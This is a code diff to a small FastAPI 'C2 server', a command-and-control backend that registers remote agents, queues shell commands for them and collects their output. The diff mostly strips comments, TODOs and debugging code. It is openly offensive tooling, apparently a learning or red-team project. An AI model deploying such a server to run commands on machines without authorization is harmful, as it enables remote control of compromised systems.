@@ -7,8 +7,6 @@ from fastapi.templating import Jinja2Templates
 from pydantic import BaseModel
 from starlette.responses import HTMLResponse, RedirectResponse
 
-# from fastapi.responses import HTMLResponse
-
 app = FastAPI(title="C2 server")
 
 templates = Jinja2Templates(directory="templates")
@@ -35,7 +33,7 @@ class TaskDetails(BaseModel):
     id: str
     agent_id: str
     command: str
-    status: str = "pending"  # failed, pending, finished
+    status: str = "pending"
 
 
 class TaskResult(BaseModel):
@@ -78,9 +76,6 @@ async def agent_details(request: Request, agent_id: str):
     if agent_id  not in agentsList:
         return RedirectResponse(url="/", status_code=404)
 
-    # TODO: Get agent details for that agent, add last seen datetime and status like in homepage
-    # TODO: Since we also send commands from this page, see if there is anything to do with that too
-
     return {"agent_id": agent_id, "agent_details": agentsList[agent_id]}
 
 
@@ -92,7 +87,6 @@ async def agent_setup(request: Request):
         agent_id=agent_id,
         name=info['name'],
         ip_addr=request.client.host,
-        # port=request.client.port,
         os_info=info['os_info'],
         last_seen=time.time()
     )
@@ -105,7 +99,6 @@ async def agent_setup(request: Request):
 
 
 # Create tasks
-# TODO: ??Update this to get data from UI textbox or something like that - or select command from dropdown??
 @app.post("/taskSetup/{agent_id}")
 async def task_setup(agent_id: str, request: Request):
     if agent_id not in agentsList:
@@ -188,28 +181,13 @@ async def receive_results(request: Request):
 
     info = await request.json()
 
-    # info = await request.body()
-    # print(f"\n\nTask Result Info: {info.decode('utf-8')}")
-    # request_extr = str(info)
-    # ind = request_extr.find('"output":"') + len('"output":"')
-    # output_str = request_extr[ind:-3]
-    # print("Extracted output:\n", output_str)
-    #
-    # ind = request_extr.find('"task_id":"') + len('"task_id":"')
-    # task_id_str = request_extr[ind:ind+36]
-    # print(f"\n\nTask ID: {task_id_str}")
-    #
-    # ind = request_extr.find('"agent_id":"') + len('"agent_id":"')
-    # agent_id_str = request_extr[ind:ind+36]
-    # print(f"\n\nAgent ID: {agent_id_str}")
-
     result_id = str(uuid.uuid4())
     result = TaskResult(
         id=result_id,
         agent_id=info['agent_id'],
         task_id=info['task_id'],
         output=info['output'],
-        result_status=1  # TODO: Need to setup an exit code status in the Agent Code for this! Or just remove it!
+        result_status=1 
     )
 
     if result.agent_id not in agentsList:
@@ -219,8 +197,6 @@ async def receive_results(request: Request):
     print(f"Details of results for {result_id}: {resultsList[result_id]}.")
     return {"result": "success"}
 
-
-# Add a function with an option to disconnect from the agent. Like a button or something?
 
 if __name__ == "__main__":
     uvicorn.run(app, host="0.0.0.0", port=8000, reload=True)
